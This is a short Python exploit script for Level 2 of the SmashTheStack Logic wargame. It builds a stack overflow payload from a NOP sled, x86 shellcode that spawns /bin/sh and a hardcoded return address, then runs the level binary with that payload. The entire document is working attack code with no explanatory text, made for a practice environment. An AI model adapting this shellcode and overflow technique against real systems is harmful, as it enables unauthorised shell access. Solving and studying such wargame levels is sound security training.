#!/usr/bin/env python
# -*- coding: utf-8 -*-

# (C) 2014 Adam Ziaja <adam@adamziaja.com> http://adamziaja.com

'''
Level 2, Logic Wargame, SmashTheStack
'''

import os

level2 = 'fsckmelogic '
nop = '\x90'
shellcode = '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'
ret = '\xc4\xd9\xff\xbf'
payload = level2 + nop * 4084 + shellcode + ret

os.system('/levels/level2/level2 ' + payload)
